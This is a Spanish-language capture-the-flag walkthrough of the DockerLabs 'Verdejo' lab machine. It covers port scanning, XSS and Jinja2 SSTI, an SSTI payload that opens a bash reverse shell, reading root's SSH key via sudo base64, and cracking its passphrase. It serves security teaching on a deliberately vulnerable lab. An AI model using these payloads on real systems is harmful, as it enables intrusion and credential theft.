---
icon: flag
---

# Verdejo DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip verdejo.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh verdejo.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 12:04 EST
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
|_  256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
8089/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 23 Jan 2025 17:04:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 537
|     Connection: close
|     <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
|     <h1>Nada interesante que buscar</h1>
|     <form>
|     <input name="user" style="border: 2px solid #0000FF; padding: 10px; border-radius: 10px; margin-bottom: 25px;" value="Hola"><br>
|     <input type="submit" value="No hay nada enserio, no toques" style="border: 0px; padding: 5px 20px ; color: #0000FF;">
|     </form>
|     <br><p style="margin-top: 30px;">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 23 Jan 2025 17:04:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8089-TCP:V=7.94SVN%I=7%D=1/23%Time=6792768D%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,2C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Thu,\x2023\x20Jan\x202025\x2017:04:13\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20537\r\nConnection:\x20close\r\n\r\n\n\x20\x20\x20\x20<html><head><t
SF:itle>Dale\x20duro\x20bro</title><style>body\x20{margin:\x2090px;\x20bac
SF:kground-image:\x20url\('/static/1366_2000\.jpg'\);}</style></head><body
SF:>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Nada\x20intere
SF:sante\x20que\x20buscar</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<form>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"user\"\x20style=\"border
SF::\x202px\x20solid\x20#0000FF;\x20padding:\x2010px;\x20border-radius:\x2
SF:010px;\x20margin-bottom:\x2025px;\"\x20value=\"Hola\"><br>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<input\x20type=\"submit\"\x20value=\"No\x20hay\x20
SF:nada\x20enserio,\x20no\x20toques\"\x20style=\"border:\x200px;\x20paddin
SF:g:\x205px\x2020px\x20;\x20color:\x20#0000FF;\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20</form>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20<b
SF:r><p\x20style=\"margin-top:\x2030px;\">\n\x20\x20\x20\x20")%r(HTTPOptio
SF:ns,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Python/
SF:3\.11\.2\r\nDate:\x20Thu,\x2023\x20Jan\x202025\x2017:04:13\x20GMT\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x
SF:20OPTIONS\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(R
SF:TSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20
SF:\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x2
SF:0\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>E
SF:rror\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x
SF:20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.70 seconds
```

Vemos que si entramos a la pagina, veremos una pagina de `apache2` normal y si realizamos un poco de `fuzzing` no veremos mucho mas, por lo que vamos a probar a meternos en el seiguiente puerto `8089` a ver que encontramos:

```
URL = http://<IP>:8089/
```

Vemos una pagina normal en la que vemos un campo para poder meter un texto, si metemos cualquier texto y le damos a `ENTER`, nos va aparecer un `Hola` mas el texto insertado, pero si nos fijamso en la `URL` vemos que tiene un parametro llamado `?user=` junto con el texto nuestro, por lo que vamos a probar a realizar un `XSS` para ver si fuera vulnerable.

```
URL = http://<IP>:8089/?user=<h1 style='color:red;'>Hola</h1>
```

Como resultado vemos que funciona y se nos pone el `Hola` en color rojo y de tamaño grande.

Pero si probamos a realizar un `SSTI` veremos que tambien funciona:

```
URL = http://<IP>:8089/?user={{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
verde:x:1000:1000::/home/verde:/bin/bash
```

#### **1. ¿Qué es SSTI (Server-Side Template Injection)?**

* SSTI ocurre cuando una aplicación web permite al usuario inyectar código malicioso en una plantilla que se procesa en el servidor.
* Los motores de plantillas como Jinja2 (en Python), Twig (en PHP) o Freemarker (en Java) procesan expresiones dinámicas en el lado del servidor.
* Si los datos del usuario no son correctamente sanitizados, pueden inyectar código arbitrario en el servidor.

***

#### **2. Análisis del Payload**

**`get_flashed_messages`**

En Flask, `get_flashed_messages` es una función usada para obtener mensajes almacenados en el sistema de "flash messages". En este contexto, el payload utiliza su atributo `__globals__`.

**`__globals__`**

En Python, `__globals__` es un atributo que referencia el espacio de nombres global de la función. Esto incluye variables, funciones y objetos globales del entorno donde fue definida.

**`__builtins__`**

* Dentro del espacio de nombres global, `__builtins__` da acceso a las funciones y clases nativas de Python, como `open`, `exec`, y `eval`.
* Al acceder a `__builtins__.open`, obtienes acceso directo a la función `open()` de Python, que permite leer o escribir archivos.

**`open("/etc/passwd").read()`**

* El archivo `/etc/passwd` contiene información sobre los usuarios del sistema en sistemas basados en Unix/Linux.
* Este comando intenta abrir y leer el contenido de `/etc/passwd`.

***

#### **3. ¿Cuándo funciona este payload?**

Este payload funcionará si se cumplen las siguientes condiciones:

1. **Vulnerabilidad SSTI**:
   * La aplicación utiliza un motor de plantillas como Jinja2 y permite al usuario inyectar expresiones dinámicas.
   *   Ejemplo: si un parámetro de usuario se pasa directamente a una plantilla sin ser sanitizado:

       python

       CopiarEditar

       `@app.route("/vulnerable") def vulnerable(): user_input = request.args.get("input") return render_template_string(user_input)`
2. **Acceso a `__globals__`:**
   * En Jinja2, al procesar plantillas, las funciones y variables globales del entorno están disponibles.
   * Esto incluye acceso a `__globals__` y `__builtins__`.
3. **Permisos adecuados:**
   * El proceso de la aplicación web debe tener permisos para leer el archivo `/etc/passwd`.

Vemos que si funciona por lo que haremos lo siguiente:

Vamos crearnos una `reverse shell` de la siguiente forma:

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
```

<figure><img src="../../.gitbook/assets/image (180) (1).png" alt=""><figcaption></figcaption></figure>

Antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Estando a la escucha, ejecutaremos lo de la pagina web y si volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 41760
bash: cannot set terminal process group (94): Inappropriate ioctl for device
bash: no job control in this shell
verde@dbd3088f8897:~$ whoami
whoami
verde
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for verde on 8411222316c4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User verde may run the following commands on 8411222316c4:
    (root) NOPASSWD: /usr/bin/base64
```

Vemos que podemos ejecutar el binario `base64` como el usuario `root`, por lo que haremos lo siguiente.

```shell
LFILE=/root/.ssh/id_rsa
sudo base64 "$LFILE" | base64 --decode
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que funciono, por lo que nos conectaremos por `ssh` mediante su clave privada.

```shell
nano id_rsa

#Dentro del nano
<CONTENIDO_ID_RSA>
```

Lo guardamos y establecemos los permisos adecuados para dicho archivo.

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa root@<IP>
```

Nos pedira la contraseña, por lo que le haremos fuerza bruta:

```shell
 ssh2john id_rsa > hash
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:01:44 DONE (2025-01-27 12:39) 0.009601g/s 34.10p/s 34.10c/s 34.10C/s cougar..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Y veremos que nos saco la contraseña, por lo que volveremos a ejecutar el comando.

```shell
ssh -i id_rsa root@<IP>
```

Metemos como contraseña `honda1`.

Info:

```
Enter passphrase for key 'id_rsa': 
Linux 8411222316c4 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 22 10:36:51 2024 from 172.17.0.1
root@8411222316c4:~# whoami
root
```

Y con esto entrariamos directamente a la maquina como el usuario `root`, por lo que ya habriamos terminado la maquina.
